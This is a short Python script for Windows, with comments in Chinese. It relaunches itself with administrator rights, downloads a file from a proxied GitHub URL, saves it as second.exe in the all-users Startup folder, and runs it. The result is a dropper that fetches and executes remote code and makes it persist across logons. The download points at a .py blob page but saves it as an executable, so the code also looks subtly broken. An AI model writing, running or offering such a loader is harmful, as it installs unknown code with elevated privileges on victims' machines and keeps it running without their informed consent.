import urllib.request
import os
import time
import ctypes
import sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():  
    url = "https://ghproxy.com/https://raw.githubusercontent.com/snow6BIG/gpt-/blob/main/second.py"#文件路径。
    dir = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"#文件下载路径目录。
    file_path = os.path.join(dir, 'second.exe')#下载为
    urllib.request.urlretrieve(url, file_path)
    
    # 检查文件是否下载完成
    if os.path.exists(file_path):
        print('File downloaded successfully.')
        print('Launching the file in 3 seconds...')
        time.sleep(3)
        os.startfile(file_path)
    else:
        print('Failed to download the file.')
else:
    if sys.version_info[0] == 3:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    else:
        ctypes.windll.shell32.ShellExecuteW(None, u"runas", unicode(sys.executable), unicode(__file__), None, 1)
